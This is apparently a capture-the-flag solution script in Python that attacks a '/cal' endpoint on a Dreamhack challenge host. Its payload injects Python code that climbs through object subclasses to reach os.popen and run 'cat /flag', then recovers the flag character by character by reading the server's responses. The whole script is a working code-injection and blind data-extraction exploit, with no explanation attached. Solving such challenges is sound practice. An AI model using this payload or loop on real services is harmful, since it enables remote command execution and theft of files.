import requests
import string

#실제로는 201

path = 'http://host3.dreamhack.games:16299/cal'
target = string.digits + 'abcdef' + '}'
flag = 'pokactf2024{'

a = "0 if '%s' == ''.__class__.__mro__[-1].__subclasses__()[80].__init__.__globals__['sys'].modules['os'].popen('cat /flag').read()[%d] else 1"
b = '1'

while flag[-1] != '}':
        for t in target:
                res = requests.post(path, data={'a': a % (t, len(flag)), 'b': b}).text
                if 'Only' not in res:
                        flag += t
                        print(flag)
                        break
        else:
                print('its not hash')
                
print(flag)
